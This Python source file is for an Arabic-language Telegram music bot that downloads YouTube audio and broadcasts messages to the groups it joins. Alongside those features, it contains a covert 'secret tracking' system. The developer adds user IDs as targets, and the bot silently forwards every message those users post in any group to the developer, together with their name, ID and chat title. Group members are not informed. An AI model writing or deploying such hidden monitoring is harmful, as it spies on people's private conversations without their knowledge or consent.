import os
import logging
import threading
import subprocess
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatPermissions
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler
# كود تثبيت FFmpeg تلقائياً عند التشغيل
def install_ffmpeg():
    if not os.path.exists('bin/ffmpeg'):
        print("📥 جاري تثبيت FFmpeg... يرجى الانتظار")
        os.makedirs('bin', exist_ok=True)
        # الرابط المباشر الصحيح
        cmd = "curl -L https://johnvansickle.com/ffmpeg/releases/ffmpeg-release-amd64-static.tar.xz | tar -xJ --strip-components=1 -C bin"
        subprocess.run(cmd, shell=True)
        print("✅ تم التثبيت بنجاح")
try:
    from static_ffmpeg import add_paths as ffmpeg_add_paths
    ffmpeg_add_paths()
except ImportError:
    subprocess.run(["pip", "install", "static-ffmpeg"])
    from static_ffmpeg import add_paths as ffmpeg_add_paths
    ffmpeg_add_paths()

print("✅ FFmpeg جاهز للعمل")
# إضافة مسار bin للـ PATH برمجياً
os.environ["PATH"] += os.path.pathsep + os.path.join(os.getcwd(), 'bin')
# --- الإعدادات ---
BOT_TOKEN = os.getenv("BOT_TOKEN")
DEVELOPER_ID = int(os.getenv("DEVELOPER_ID", "0"))

# تخزين البيانات في الذاكرة (يفضل مستقبلاً ربطها بقاعدة بيانات)
SPY_LIST = [] 
GROUPS_LIST = set() 
SPY_STATUS = True

# إعداد السجلات
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- 1. محرك التتبع وتسجيل المجموعات ---
def main_engine(update: Update, context: CallbackContext):
    global SPY_STATUS, SPY_LIST, GROUPS_LIST
    
    chat = update.effective_chat
    user = update.effective_user
    
    # تسجيل المجموعات تلقائياً
    if chat and chat.type in ['group', 'supergroup']:
        GROUPS_LIST.add(chat.id)

    # نظام التتبع السري (للمطور فقط)
    if SPY_STATUS and user and user.id in SPY_LIST:
        if update.message:
            report = (f"🕵️‍♂️ تنبيه تتبع:\n"
                      f"👤 الاسم: {user.first_name}\n"
                      f"🆔 الآيدي: {user.id}\n"
                      f"📍 المكان: {chat.title if chat.title else 'خاص'}\n")
            
            context.bot.send_message(chat_id=DEVELOPER_ID, text=report, parse_mode='Markdown')
            context.bot.forward_message(chat_id=DEVELOPER_ID, 
                                        from_chat_id=chat.id, 
                                        message_id=update.message.message_id)

# --- 2. ميزة الإذاعة (Broadcast) للمطور ---
def broadcast_logic(update: Update, context: CallbackContext):
    if update.effective_user.id != DEVELOPER_ID: return
    
    if not update.message.reply_to_message:
        update.message.reply_text("❌ قم بالرد على الرسالة التي تريد إذاعتها بكلمة 'اذاعة'.")
        return

    msg = update.message.reply_to_message
    success, failed = 0, 0
    
    for gid in list(GROUPS_LIST):
        try:
            context.bot.copy_message(chat_id=gid, from_chat_id=msg.chat_id, message_id=msg.message_id)
            success += 1
        except:
            failed += 1
            GROUPS_LIST.discard(gid)

    update.message.reply_text(f"📢 نتيجة الإذاعة:\n✅ نجاح: {success}\n❌ فشل: {failed}")

# --- 3. تحميل الموسيقى (YouTube) ---
def play_music(update: Update, context: CallbackContext):
    from yt_dlp import YoutubeDL
    query = " ".join(context.args)
    if not query:
        update.message.reply_text("اكتب اسم الأغنية بعد الأمر، مثال: /شغل يانبي سلام عليك")
        return

    status_msg = update.message.reply_text("⏳ جاري البحث والتحميل...")
    
    try:
        ydl_opts = {
            'format': 'bestaudio/best',
            'outtmpl': 'downloads/%(title)s.%(ext)s',
            'postprocessors': [{'key': 'FFmpegExtractAudio','preferredcodec': 'mp3','preferredquality': '192'}],
            'quiet': True
        }
        with YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(f"ytsearch:{query}", download=True)['entries'][0]
            file_path = ydl.prepare_filename(info).rsplit('.', 1)[0] + ".mp3"
            update.message.reply_audio(audio=open(file_path, 'rb'), title=info.get('title'))
            os.remove(file_path)
            status_msg.delete()
    except Exception as e:
        status_msg.edit_text(f"❌ حدث خطأ: {str(e)}")

# --- 4. لوحة تحكم المطور ---
def admin_panel(update: Update, context: CallbackContext):
    if update.effective_user.id != DEVELOPER_ID: return
    
    keyboard = [
        [InlineKeyboardButton("➕ إضافة هدف", callback_data='add_id'),
         InlineKeyboardButton("📋 قائمة التتبع", callback_data='show_spy')],
        [InlineKeyboardButton("📢 إذاعة للمجموعات", callback_data='info_bc')],
        [InlineKeyboardButton("✅ تشغيل" if not SPY_STATUS else "📴 إيقاف التتبع", callback_data='toggle_spy')]
    ]
    update.message.reply_text(f"🛠 لوحة التحكم للمطور\n👥 المجموعات النشطة: {len(GROUPS_LIST)}", 
                             reply_markup=InlineKeyboardMarkup(keyboard))

def button_handler(update: Update, context: CallbackContext):
    global SPY_STATUS, SPY_LIST
    query = update.callback_query
    query.answer()
    
    if query.data == 'toggle_spy':
        SPY_STATUS = not SPY_STATUS
        query.edit_message_text(f"📢 حالة التتبع: {'شغال ✅' if SPY_STATUS else 'متوقف 📴'}")
    elif query.data == 'show_spy':
        msg = "📋 الأهداف الحالية:\n" + "\n".join([f"• {i}" for i in SPY_LIST]) if SPY_LIST else "لا يوجد أهداف."
        query.edit_message_text(msg, parse_mode='Markdown')
    elif query.data == 'info_bc':
        query.edit_message_text("للإذاعة: قم بالرد على أي رسالة واكتب كلمة 'اذاعة'.")
    elif query.data == 'add_id':
        query.edit_message_text("أرسل الآيدي هكذا: تتبع 123456")

# --- 5. أوامر نصية للمطور ---
def text_commands(update: Update, context: CallbackContext):
    if update.effective_user.id != DEVELOPER_ID: return
    text = update.message.text
    
    if text.startswith("تتبع"):
        try:
            tid = int(text.split()[1])
            if tid not in SPY_LIST:
                SPY_LIST.append(tid)
                update.message.reply_text(f"✅ تمت إضافة {tid} للتتبع.")
        except:
            update.message.reply_text("❌ خطأ في الآيدي.")

# --- تشغيل البوت ---
def main():
    if not os.path.exists('downloads'): os.makedirs('downloads')
    
    updater = Updater(BOT_TOKEN)
    dp = updater.dispatcher

    dp.add_handler(MessageHandler(Filters.text & (~Filters.command), main_engine), group=1)
    dp.add_handler(CommandHandler("panel", admin_panel))
    dp.add_handler(CommandHandler("play", play_music))
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.regex(r'^اذاعة$'), broadcast_logic))
    dp.add_handler(MessageHandler(Filters.regex(r'^تتبع'), text_commands))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":

    main()






